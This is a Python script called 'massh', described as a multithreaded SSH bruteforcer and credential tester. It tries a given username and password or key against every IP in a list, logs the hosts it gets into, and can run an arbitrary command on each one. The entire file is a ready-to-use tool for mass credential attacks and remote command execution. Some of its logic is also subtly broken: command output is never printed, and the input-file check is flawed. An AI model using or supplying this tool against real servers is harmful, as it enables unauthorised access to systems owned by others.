#!/usr/bin/env python3

import argparse, os, socket, sys, time
from multiprocessing import Pool
try:
	from colorama import Fore, init
	import paramiko, tqdm
except ImportError as e:
	print('[-] Failed to import an external module [%s]' % str(e))
	print('    Please install the required modules inside the requirements.txt file')
	sys.exit(1)

version = "1.0"

init() # Colored output

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

parser = argparse.ArgumentParser(description="massh (Mass-SSH): multithreaded ssh bruteforcer/cred-tester")
parser.add_argument('-i',
					help='List of IPs to process',
					metavar='FILE',
					type=str,
					required=True) # Input file argument
parser.add_argument('-paramiko-log',
					help='Paramiko debug log [default: none/off]',
					metavar='FILE',
					type=str) # Paramiko (the SSH client)'s log file location
parser.add_argument('-o',
					help='Output successful IPs to FILE [default: successful.log]',
					metavar='FILE',
					type=str,
					default='successful.log') # Where to output successful IPs
parser.add_argument('-u',
					help='Set username [default: root]',
					type=str,
					required=True,
					default='root')
parser.add_argument('-p',
					help='Set password [default: none]',
					type=str,
					required=True)
parser.add_argument('-t',
					help='Threads for multiprocessing [default: 8]',
					type=int,
					default=8)
parser.add_argument('-debug',
					help='Show debug information [default: off]',
					action='store_true')
parser.add_argument('-ssh-key',
					help='Try auth with KEY as SSH key [default: none]',
					metavar='KEY',
					type=str) # Public key auth
parser.add_argument('-c',
					help='Run CMD after a successful connection [default: none]',
					metavar='CMD',
					type=str) # For example, run "uname -a" or "lscpu"
parser.add_argument('-disable-multiproc',
					help='Disable multiprocessing support [default: no]',
					action='store_true')
args = parser.parse_args()

failtext = Fore.RED + '\tFAILED' + Fore.RESET
succtext = Fore.GREEN + '\tSUCCEEDED' + Fore.RESET

def debugPrint(strg):
	if args.debug:
		print("[D] " + strg)

def fileCorrect():
	"""
		Check if the file provided using the -i/--input argument exists
	"""
	try:
		return os.path.isfile(args.i) == True or os.path.getsize(args.i) != 0
	except:
		return False

def connect(server, username, password=None, key=None, cmd=None):
	"""
		SSH connect function
	"""
	try:
		if password != None:
			ssh.connect(server, username=username, password=password, timeout=5, look_for_keys=False)
		elif key != None:
			ssh.connect(server, username=username, key_filename=key, timeout=5)
		with open(args.o, 'a') as fl:
			fl.write(server)
			if args.c:
				si, so, se = ssh.exec_command(cmd)
				time.sleep(1)
				si.close()
				fl.write(' | %s' % so.readlines())
			fl.write('\n')
		ssh.close()
		if args.c:
			return so.readlines()
		else:
			return 0 # Success
	except paramiko.AuthenticationException as g:
		return 1 # Authentication error
	except paramiko.ssh_exception.NoValidConnectionsError:
		return 2 # Connection error
	except socket.error:
		return 3 # Timeout
	except paramiko.ssh_exception.SSHException:
		return 4 # Generic SSH error
	except KeyboardInterrupt:
		return 9 # Interrupted
	except:
		return 5 # Unknown

def check(ip):
	"""
		Multi-threaded check function - only shows successful IPs, no counters, for now no error handling
	"""
	if args.debug:
		debugPrint("Multiproc - check IP %s" % ip)
	r = connect(ip, args.u, password=args.p, key=args.ssh_key, cmd=args.c)
	if r == 0:
		if args.c:
			try:
				print('%s -- %s' % (ip, r[0].replace('\n', '')))
			except IndexError:
				print('%s -- NO OUTPUT' % ip)
		else:
			print(Fore.GREEN + "[✓]" + Fore.RESET + " %s -- Auth success" % ip)
	else:
		debugPrint("%s failed with non-zero exit code %s" % (ip, r))

def main():
	print(Fore.BLUE + '[i]' + Fore.RESET + ' massh (Mass-SSH) %s' % version)
	if not fileCorrect():
		print(Fore.RED + '[X]' + Fore.RESET + ' File %s does not exist, or is unreadable.' % args.i)
		sys.exit(1)
	print('\n' + Fore.BLUE + '[i]' + Fore.RESET + ' Reading from %s as input file.' % args.i)
	if args.disable_multiproc:
		print(Fore.YELLOW + '[!]' + Fore.RESET + ' Multiprocessing mode disabled! Expect speeds up to 80x slower than multithreaded mode.')
	if args.paramiko_log:
		paramiko.util.log_to_file(args.paramiko_log)
	targets = [g.strip() for g in open(args.i, 'r').readlines()]
	print((Fore.BLUE + '[i]' + Fore.RESET + ' %s found\n' % (str(len(targets)) + ' target' if len(targets) < 2 else str(len(targets)) + ' targets')))
	try:
		if args.disable_multiproc:
			for ip in targets:
				check(ip)
		else:
			debugPrint("Init multiprocessing Pool() with %s threads" % args.t)
			p = Pool(processes=args.t)
			for _ in tqdm.tqdm(p.map(check, targets), total=len(targets)):
				pass
	except KeyboardInterrupt:
#		print(('\n\n' + Fore.YELLOW + '[!]' + Fore.RESET + ' Interrupted!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
		print("Ctrl+C")
		sys.exit(0)

if __name__ == "__main__":
	main()
